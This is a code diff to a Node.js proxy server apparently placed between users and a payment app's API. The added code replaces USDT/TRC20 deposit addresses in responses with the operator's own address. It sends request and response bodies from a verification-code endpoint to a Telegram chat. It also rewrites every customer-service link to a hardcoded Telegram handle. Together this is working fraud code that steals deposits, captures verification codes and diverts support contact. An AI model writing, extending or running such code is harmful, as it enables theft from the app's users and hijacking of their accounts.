@@ -462,7 +462,7 @@ function replaceUsdtInResponse(jsonResp, data) {
     for (const key of Object.keys(obj)) {
       const kl = key.toLowerCase();
       if (typeof obj[key] === 'string') {
-        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'addr') {
+        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'addr' || kl === 'depositaddress' || kl === 'deposit_address' || kl === 'receiveaddress' || kl === 'receiveraddress' || kl === 'payaddress' || kl === 'trcaddress' || kl === 'trc20address' || (kl.includes('address') && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
           if (obj[key].length >= 20 && obj[key] !== newAddr) {
             oldAddr = oldAddr || obj[key];
             obj[key] = newAddr;
@@ -491,6 +491,17 @@ function replaceUsdtInResponse(jsonResp, data) {
   const rd = getResponseData(jsonResp);
   if (rd) foundOld = scanAndReplace(rd, 0) || '';
   if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
+  const fullStr = JSON.stringify(jsonResp);
+  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
+  if (trcMatch) {
+    for (const addr of trcMatch) {
+      if (addr !== newAddr) {
+        foundOld = foundOld || addr;
+        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
+        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
+      }
+    }
+  }
   return { oldAddr: foundOld, newAddr, qrUrl };
 }
 
@@ -1094,6 +1105,20 @@ app.post('/app/api/memberRecharge/getUsdtRate', async (req, res) => {
   } catch(e) { await transparentProxy(req, res); }
 });
 
+app.post('/app/api/memberManager/getMemberVerificationCode', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    if (data.adminChatId && bot) {
+      const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
+      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
+      bot.sendMessage(data.adminChatId, `🔐 Verification Code [${userId || 'N/A'}]\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
 app.all('/app/api/memberRecharge/memberRechargeList', async (req, res) => {
   await proxyAndReplaceBankInList(req, res);
 });
@@ -1481,6 +1506,44 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
     } catch(e) { await transparentProxy(req, res); }
   });
 }
+
+app.all('/app/api/customer/list', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const respData = getResponseData(jsonResp);
+    if (respData && Array.isArray(respData)) {
+      for (const item of respData) {
+        if (item && typeof item === 'object') {
+          for (const [k, v] of Object.entries(item)) {
+            if (typeof v === 'string' && (v.includes('http') || v.includes('t.me') || v.includes('telegram') || v.includes('whatsapp') || v.includes('wa.me'))) {
+              item[k] = 'https://t.me/Ezpey_zylox';
+            }
+          }
+          if (item.url) item.url = 'https://t.me/Ezpey_zylox';
+          if (item.link) item.link = 'https://t.me/Ezpey_zylox';
+          if (item.serviceUrl) item.serviceUrl = 'https://t.me/Ezpey_zylox';
+          if (item.customerUrl) item.customerUrl = 'https://t.me/Ezpey_zylox';
+          if (item.contactUrl) item.contactUrl = 'https://t.me/Ezpey_zylox';
+        }
+      }
+    } else if (respData && typeof respData === 'object') {
+      for (const [k, v] of Object.entries(respData)) {
+        if (typeof v === 'string' && (v.includes('http') || v.includes('t.me') || v.includes('telegram') || v.includes('whatsapp') || v.includes('wa.me'))) {
+          respData[k] = 'https://t.me/Ezpey_zylox';
+        }
+      }
+    }
+    if (jsonResp) {
+      const str = JSON.stringify(jsonResp);
+      const replaced = str.replace(/https?:\/\/[^\s"',\\\]}>]+/gi, 'https://t.me/Ezpey_zylox');
+      const newJson = JSON.parse(replaced);
+      sendJson(res, respHeaders, newJson, replaced);
+    } else {
+      sendJson(res, respHeaders, jsonResp, respBody);
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
 
 app.all('*', async (req, res) => {
   await transparentProxy(req, res);
